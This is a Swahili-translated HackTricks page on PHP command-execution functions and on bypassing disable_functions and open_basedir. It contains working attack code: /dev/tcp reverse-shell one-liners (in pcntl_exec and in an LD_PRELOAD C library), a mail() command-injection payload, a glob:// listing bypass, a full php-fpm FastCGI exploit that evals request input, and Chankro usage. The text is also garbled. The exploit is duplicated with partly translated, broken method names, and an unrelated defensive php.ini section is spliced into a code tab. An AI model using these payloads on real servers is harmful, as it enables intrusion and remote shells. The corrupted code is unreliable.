# PHP - Useful Functions & disable\_functions/open\_basedir bypass

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## PHP Amri & Utekelezaji wa Kanuni

### Utekelezaji wa Amri za PHP

**Note:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) webshell ya php inaweza **kwa moja kwa moja** kuchunguza na kuzidisha kazi zifuatazo ikiwa baadhi yao zimezimwa.

**exec** - Inarudisha mstari wa mwisho wa matokeo ya amri

```bash
echo exec("uname  -a");
```

**passthru** - Inapeleka matokeo ya amri moja kwa moja kwenye kivinjari

```bash
echo passthru("uname -a");
```

**system** - Inapeleka matokeo ya amri moja kwa moja kwenye kivinjari na kurudisha mstari wa mwisho

```bash
echo system("uname -a");
```

**shell\_exec** - Inarudisha matokeo ya amri

```bash
echo shell_exec("uname -a");
```

\`\` (backticks) - Sawa na shell\_exec()

```bash
echo `uname -a`
```

**popen** - Inafungua mrija wa kusoma au kuandika kwa mchakato wa amri

```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```

**proc\_open** - Sawa na popen() lakini ina kiwango kikubwa cha udhibiti

```bash
proc_close(proc_open("uname -a",array(),$something));
```

**preg\_replace**

Hii ni kazi ya PHP ambayo inatumika kubadilisha maandishi kwa kutumia mzunguko wa kawaida (regular expression). Inachukua mfano wa maandishi na kubadilisha sehemu zilizopatikana kulingana na mzunguko wa kawaida uliopewa.

Matumizi ya kawaida ya kazi hii ni kubadilisha maandishi yaliyopatikana kwenye faili au kwenye ukurasa wa wavuti. Inaweza kutumiwa kufanya marekebisho kama vile kuondoa au kubadilisha sehemu za maandishi, kuondoa vitambulisho vya HTML, au hata kubadilisha muundo wa maandishi.

Kwa mfano, ikiwa tuna neno "Hello" katika maandishi yetu na tunataka kubadilisha kuwa "Hujambo", tunaweza kutumia kazi ya preg\_replace kama ifuatavyo:

```php
$text = "Hello, how are you?";
$newText = preg_replace("/Hello/", "Hujambo", $text);
echo $newText;
```

Hii itatoa matokeo ya "Hujambo, how are you?".

Kumbuka kwamba preg\_replace inatumia mzunguko wa kawaida, kwa hivyo unahitaji kujua jinsi ya kuandika mzunguko wa kawaida sahihi ili kufanya marekebisho unayotaka.

```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```

**pcntl\_exec** - Inatekeleza programu (kwa chaguo-msingi katika PHP ya kisasa na isiyo ya kisasa, unahitaji kupakia moduli ya `pcntl.so` ili kutumia kazi hii)

```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```

**mail / mb\_send\_mail** - Kazi hii hutumiwa kutuma barua pepe, lakini inaweza pia kutumiwa vibaya kuingiza amri za kiholela ndani ya parameter `$options`. Hii ni kwa sababu kawaida **kazi ya php `mail`** huwaita binary ya `sendmail` ndani ya mfumo na inaruhusu kuweka **chaguo za ziada**. Walakini, hautaweza kuona matokeo ya amri iliyotekelezwa, kwa hivyo inashauriwa kuunda script ya shell ambayo inaandika matokeo kwenye faili, kuitekeleza kwa kutumia mail, na kuchapisha matokeo:

```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```

**dl** - Kazi hii inaweza kutumika kwa ajili ya kupakia kwa kudumu kipengele cha PHP. Kazi hii haitakuwepo kila wakati, hivyo unapaswa kuhakikisha kama ipo kabla ya kujaribu kuitumia vibaya. Soma [ukurasa huu ili kujifunza jinsi ya kuitumia vibaya kazi hii](disable\_functions-bypass-dl-function.md).

### Utekelezaji wa Msimbo wa PHP

Mbali na eval, kuna njia nyingine za kutekeleza msimbo wa PHP: include/require inaweza kutumika kwa ajili ya utekelezaji wa msimbo wa mbali kwa njia ya udhaifu wa Kuingiza Faili za Ndani na Kuingiza Faili za Mbali.

```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```

## disable\_functions & open\_basedir

**disable\_functions** ni mipangilio inayoweza kusanidiwa katika faili za `.ini` katika PHP ambayo itakataza matumizi ya **functions** zilizotajwa. **open\_basedir** ni mipangilio inayoelekeza PHP kwenye folda ambayo inaweza kufikia.\
Mipangilio ya PHP inapaswa kusanidiwa katika njia _/etc/php7/conf.d_ au njia sawa.

Mipangilio yote inaweza kuonekana katika matokeo ya **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (347).png>)

## open\_basedir Bypass

`open_basedir` itasanidi folda ambazo PHP inaweza kufikia, hautaweza kuandika/kusoma/kutekeleza faili yoyote nje ya folda hizo, lakini pia hautaweza hata kuorodhesha folda nyingine.\
Hata hivyo, ikiwa kwa njia fulani unaweza kutekeleza nambari ya PHP isiyojulikana unaweza **jaribu** vipande vifuatavyo vya **codes** kujaribu **kupita** kizuizi.

### Kuorodhesha folda na kizuizi cha glob:// bypass

Katika mfano wa kwanza, itatumika itifaki ya `glob://` na kizuizi cha njia fulani:

```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```

**Note1**: Katika njia unaweza pia kutumia `/e??/*` kuorodhesha `/etc/*` na folda nyingine yoyote.\
**Note2**: Inaonekana sehemu ya nambari imejirudia, lakini hiyo ni muhimu!\
**Note3**: Mfano huu ni muhimu tu kwa kuorodhesha folda, sio kusoma faili.

### Kukiuka kabisa open\_basedir kwa kutumia FastCGI

Ikiwa unataka **kujifunza zaidi kuhusu PHP-FPM na FastCGI** unaweza kusoma [sehemu ya kwanza ya ukurasa huu](disable\_functions-bypass-php-fpm-fastcgi.md).\
Ikiwa **`php-fpm`** imehifadhiwa unaweza kuitumia kukiuka kabisa **open\_basedir**:

![](<../../../../.gitbook/assets/image (350).png>)

![](<../../../../.gitbook/assets/image (349).png>)

Tafadhali kumbuka kwamba jambo la kwanza unahitaji kufanya ni kupata **unix socket ya php-fpm**. Kawaida iko chini ya `/var/run` kwa hivyo unaweza **kutumia nambari iliyotangulia kuorodhesha saraka na kuipata**.\
Nambari kutoka [hapa](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).

````php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
````

```php
* @return String
*/
public function ombi(array $params, $stdin)
{
$response = '';
$this->unganisha();
$ombi = $this->jengaPakiti(self::OMBIZO_LA_KUANZA, chr(0) . chr(self::JIBU) . chr((int) $this->_endeleaKuishi) . str_repeat(chr(0), 5));
$ombiParams = '';
foreach ($params as $funguo => $thamani) {
$ombiParams .= $this->jengaNvpair($funguo, $thamani);
}
if ($ombiParams) {
$ombi .= $this->jengaPakiti(self::PARAMS, $ombiParams);
}
$ombi .= $this->jengaPakiti(self::PARAMS, '');
if ($stdin) {
$ombi .= $this->jengaPakiti(self::STDIN, $stdin);
}
$ombi .= $this->jengaPakiti(self::STDIN, '');
fwrite($this->_sock, $ombi);
do {
$jibu = $this->somaPakiti();
if ($jibu['aina'] == self::STDOUT || $jibu['aina'] == self::STDERR) {
$response .= $jibu['maudhui'];
}
} while ($jibu && $jibu['aina'] != self::OMBIZO_LA_MALIZO);
var_dump($jibu);
if (!is_array($jibu)) {
throw new Exception('Ombi mbaya');
}
switch (ord($jibu['maudhui']{4})) {
case self::HAIWEZI_MPX_CONN:
throw new Exception('Programu hii haiwezi kuchanganya [HAIWEZI_MPX_CONN]');
break;
case self::IMEZIDI:
throw new Exception('Ombi jipya limekataliwa; shughuli nyingi [IMEZIDI]');
break;
case self::JUKUMU_HALIJAFAHAMIKA:
throw new Exception('Thamani ya jukumu haijulikani [JUKUMU_HALIJAFAHAMIKA]');
break;
case self::OMBIZO_KAMILI:
return $response;
}
}
}
?>
<?php
// mwanzo wa udanganyifu halisi hapa
if (!isset($_REQUEST['cmd'])) {
die("Angalia kuingiza kwako\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'amri='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // mzigo wa php -- Haifanyi chochote
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'amri='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Piga: $uri\n\n";
echo $client->ombi($params, $code)."\n";
?>
```

Hati hii itawasiliana na **unix socket ya php-fpm** (kawaida iko katika /var/run ikiwa fpm inatumika) ili kutekeleza nambari yoyote. Mipangilio ya `open_basedir` itafutwa na sifa ya **PHP\_VALUE** inayotumwa.\
Tazama jinsi `eval` inavyotumiwa kutekeleza nambari ya PHP unayotuma ndani ya parameter ya **cmd**.\
Pia tazama **mstari uliohifadhiwa 324**, unaweza kuondoa alama yake na **payload itaunganisha moja kwa moja kwenye URL iliyotolewa na kutekeleza nambari ya PHP** iliyo ndani yake.\
Fikia `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` ili kupata maudhui ya faili ya `/etc/passwd`.

{% hint style="warning" %}
Unaweza kufikiria kuwa kwa njia ile ile tulivyofuta mazingira ya usanidi wa `open_basedir` tunaweza **kufuta `disable_functions`**. Vizuri, jaribu, lakini haitafanya kazi, inaonekana **`disable_functions` inaweza tu kusanidiwa katika faili ya usanidi ya php ya `.ini`** na mabadiliko unayofanya kwa kutumia PHP\_VALUE hayatakuwa na athari kwenye mazingira haya maalum.
{% endhint %}

## Kupita kizuizi cha disable\_functions

Ikiwa unaweza kuwa na nambari ya PHP inayotekelezwa ndani ya kompyuta, labda unataka kwenda hatua inayofuata na **kutekeleza amri za mfumo zisizo na kikomo**. Katika hali hii, ni kawaida kugundua kuwa zaidi au zote **kazi za PHP** zinazoruhusu **utekelezaji wa amri za mfumo zimelemazwa** katika **`disable_functions`.**\
Basi, hebu tuone jinsi unavyoweza kuvuka kizuizi hiki (ikiwa unaweza)

### Ugunduzi wa kuvuka kizuizi kiotomatiki

Unaweza kutumia zana [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) na itakuonyesha ni kazi gani (ikiwapo zipo) unaweza kutumia kuvuka **`disable_functions`**.

### Kuvuka kizuizi kwa kutumia kazi nyingine za mfumo

Rudi mwanzoni mwa ukurasa huu na **angalia ikiwa kuna kazi yoyote inayotekeleza amri ambayo haijalemazwa na ipo katika mazingira**. Ikiwa utapata angalau moja, utaweza kuitumia kutekeleza amri za mfumo zisizo na kikomo.

### Kuvuka kizuizi cha LD\_PRELOAD

Inajulikana vizuri kuwa baadhi ya kazi katika PHP kama vile `mail()` zitafanya **utekelezaji wa programu ndani ya mfumo**. Kwa hivyo, unaweza kuzitumia kwa kutumia mazingira ya `LD_PRELOAD` ili kufanya ziweke maktaba ya kiholela ambayo inaweza kutekeleza chochote.

#### Kazi ambazo zinaweza kutumika kuvuka disable\_functions na LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: Inafanya kazi wakati moduli ya `php-mbstring` imefungwa.
* **`imap_mail`**: Inafanya kazi ikiwa moduli ya `php-imap` ipo.
* **`libvirt_connect`**: Inahitaji moduli ya `php-libvirt-php`.
* **`gnupg_init`**: Inaweza kutumika na moduli ya `php-gnupg` imefungwa.
* **`new imagick()`**: Darasa hili linaweza kutumika kuvuka vizuizi. Mbinu kamili za kuvamia zinaweza kupatikana katika [**makala hii**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Unaweza [**kupata hapa**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) hati ya kufanya majaribio ambayo ilitumiwa kupata kazi hizo.

Hapa kuna maktaba unayoweza kuunda ili kutumia mazingira ya `LD_PRELOAD`:

```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```

#### Kupitisha kwa kutumia Chankro

Ili kutumia kasoro hii ya usanidi vibaya, unaweza kutumia [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Hii ni zana ambayo ita **zalisha shambulio la PHP** ambalo unahitaji kupakia kwenye seva yenye kasoro na kuitekeleza (kufikia kupitia wavuti).\
**Chankro** itaandika ndani ya diski ya waathirika **maktaba na kichwa cha upande wa nyuma** unayotaka kutekeleza na itatumia\*\* mbinu ya `LD_PRELOAD` + kazi ya PHP ya `mail()`\*\* kutekeleza kichwa cha upande wa nyuma.

Tafadhali kumbuka kwamba ili kutumia **Chankro**, `mail` na `putenv` **hazipaswi kuonekana ndani ya orodha ya `disable_functions`**.\
Katika mfano ufuatao unaweza kuona jinsi ya **kuunda shambulio la chankro** kwa **arch 64**, ambayo itatekeleza `whoami` na kuokoa matokeo katika _/tmp/chankro\_shell.out_, chankro ita **andika maktaba na mzigo** katika _/tmp_ na **shambulio la mwisho** litaitwa **bicho.php** (hiyo ndiyo faili unayohitaji kupakia kwenye seva ya waathirika):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```

### Maelezo

Katika mazingira ya PHP, kuna mali mbili muhimu ambazo zinaweza kutumiwa kuzuia au kudhibiti vitendo fulani vya kawaida vya PHP. Mali hizi ni `disable_functions` na `open_basedir`. Katika sehemu hii, tutajadili jinsi ya kuzitumia kwa ufanisi kwenye mazingira ya mtandao.

#### `disable_functions`

Mali ya `disable_functions` inaruhusu wewe kuzuia utekelezaji wa kazi fulani za PHP. Kwa mfano, unaweza kuzuia kazi kama `exec`, `system`, au `shell_exec` ambazo zinaweza kutumiwa kwa madhumuni ya utekelezaji wa amri ya mfumo. Ili kufanya hivyo, unahitaji kuhariri faili ya konfigurisheni ya PHP (`php.ini`) na kuongeza orodha ya kazi ambazo unataka kuzima.

Hapa kuna hatua za kufuata:

1. Fungua faili ya konfigurisheni ya PHP (`php.ini`).
2. Tafuta sehemu inayohusiana na `disable_functions`.
3. Ongeza kazi ambazo unataka kuzima kwenye orodha hiyo.
4. Hifadhi na funga faili ya konfigurisheni ya PHP.

Baada ya kufanya mabadiliko haya, kazi zilizozimwa hazitaweza kutekelezwa kwenye mazingira ya PHP.

#### `open_basedir`

Mali ya `open_basedir` inaruhusu wewe kudhibiti eneo ambalo PHP inaruhusiwa kufikia faili na saraka. Kwa kawaida, PHP inaweza kufikia faili na saraka zote kwenye mfumo wa faili. Hata hivyo, kwa kutumia `open_basedir`, unaweza kuzuia ufikiaji wa faili na saraka zisizo na ulazima.

Ili kufanya hivyo, unahitaji kuhariri faili ya konfigurisheni ya PHP (`php.ini`) na kuweka njia ya saraka ambazo PHP inaruhusiwa kufikia.

Hapa kuna hatua za kufuata:

1. Fungua faili ya konfigurisheni ya PHP (`php.ini`).
2. Tafuta sehemu inayohusiana na `open_basedir`.
3. Weka njia za saraka ambazo PHP inaruhusiwa kufikia.
4. Hifadhi na funga faili ya konfigurisheni ya PHP.

Baada ya kufanya mabadiliko haya, PHP itakuwa na uwezo mdogo wa kufikia faili na saraka zilizo nje ya njia zilizowekwa.

#### Kuzidisha Vizuizi

Katika hali nyingi, mali ya `disable_functions` na `open_basedir` hutumiwa pamoja ili kuongeza usalama wa mazingira ya PHP. Kwa kuzidisha vizuizi hivi, unaweza kuzuia utekelezaji wa kazi hatari na kudhibiti ufikiaji wa faili na saraka. Hii inaweza kuwa muhimu katika kuzuia mashambulizi ya kuingilia kati na kudhibitiwa kwenye mazingira ya PHP.

```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Ikiwa utagundua kuwa kazi ya **mail** imezuiliwa na kazi zilizozimwa, bado unaweza kutumia kazi ya **mb\_send\_mail.**\
Maelezo zaidi kuhusu mbinu hii na Chankro hapa: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Kupitisha" kwa kutumia uwezo wa PHP

Kumbuka kuwa kwa kutumia **PHP** unaweza **kusoma na kuandika faili, kuunda saraka na kubadilisha ruhusa**.\
Unaweza hata **kudumpi databases**.\
Labda kwa kutumia **PHP** kuorodhesha sanduku unaweza kupata njia ya kuongeza mamlaka/kutekeleza amri (kwa mfano kusoma baadhi ya funguo za siri za ssh).

Nimeunda webshell ambayo inafanya iwe rahisi sana kufanya vitendo hivi (kumbuka kuwa webshells nyingi zitakupa chaguo hili pia): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Njia za kuzidisha kwa kutegemea Moduli/Toleo

Kuna njia kadhaa za kuzidisha disable\_functions ikiwa moduli fulani maalum inatumika au kudukua toleo fulani la PHP:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Kupitisha na FFI - Foreign Function Interface imewezeshwa**](https://github.com/carlospolop/hacktricks/blob/sw/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Kupitisha kupitia mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**PHP Perl Extension Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**kazi ya dl**](disable\_functions-bypass-dl-function.md)
* [**Dukizo hili**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - inaweza kudukuliwa na mabadiliko madogo kwenye PoC
* 7.0 - toleo zote hadi sasa
* 7.1 - toleo zote hadi sasa
* 7.2 - toleo zote hadi sasa
* 7.3 - toleo zote hadi sasa
* 7.4 - toleo zote hadi sasa
* 8.0 - toleo zote hadi sasa
* [**Kutoka 7.0 hadi 8.0 dudizo (Unix pekee)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
